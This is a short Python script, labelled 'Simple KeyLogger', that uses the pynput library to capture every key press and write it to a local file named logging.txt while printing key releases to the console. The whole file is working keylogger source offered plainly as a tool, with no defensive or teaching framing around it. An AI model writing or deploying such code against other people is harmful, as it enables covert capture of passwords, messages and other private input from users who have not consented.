import logging
from pynput import keyboard
from pynput.keyboard import Listener

# Simple KeyLogger.

logging.basicConfig(filename='logging.txt', level=logging.INFO, format='%(message)s')

def on_press(key):
    key
    logging.info(msg=key)

def on_release(key):
    print(f'{key} released.')

with Listener(on_press=on_press, on_release=on_release) as L:
    L.join()
